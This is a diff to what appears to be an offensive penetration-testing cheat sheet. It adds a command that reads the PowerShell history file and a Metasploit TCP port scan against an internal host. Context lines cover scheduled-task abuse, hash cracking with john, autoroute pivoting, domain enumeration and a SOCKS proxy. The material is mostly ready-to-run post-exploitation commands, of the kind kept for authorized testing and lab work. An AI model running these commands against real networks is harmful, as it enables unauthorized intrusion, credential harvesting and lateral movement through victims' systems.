@@ -962,6 +962,9 @@ powershell_execute "Get-ScheduledTask | Where-Object {($_.Author -notmatch 'Micr
 powershell_execute "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task; $filePath = $task.Actions.Execute; Get-Acl $filePath | Select-Object PSChildName, PSPath, AccessToString"
 powershell_execute "Start-ScheduledTask -TaskName 'Ownership'"
 
++---------- PowerShell History ----------+
+powershell_execute "type (Get-PSReadLineOption).HistorySavePath"
+
 +---------- Network Environment ----------+
 powershell_execute "powershell -c \"& { Get-NetTCPConnection -State Listen,Established | Where-Object { `$_."LocalAddress" -notin @('0.0.0.0','127.0.0.1') -and `$_."RemoteAddress" -notmatch '::' } | Sort-Object LocalAddress,LocalPort | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Format-Table -AutoSize }\""
 powershell_execute "arp -a"
@@ -1053,9 +1056,18 @@ nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes 
 +---------- Create Route ----------+
 run post/multi/manage/autoroute
 
-+---------- Scan For Hosts ----------+
++---------- Discover Hosts ----------+
 run post/windows/gather/enum_domain
 run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24 BATCHSIZE=32 THREADS=24
+
++---------- Port Scan Hosts ----------+
+background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 10.1.5.3
+set PORTS 21,22,23,53,88,135,389,445,1433,2049,3306,3389,5985
+set CONCURRENCY 20
+set TIMEOUT 20
+set THREADS 20
 
 +---------- Setup Socks Proxy ----------+
 run auxiliary/server/socks_proxy SRVHOST=127.0.0.1 SRVPORT=9050 VERSION=4a
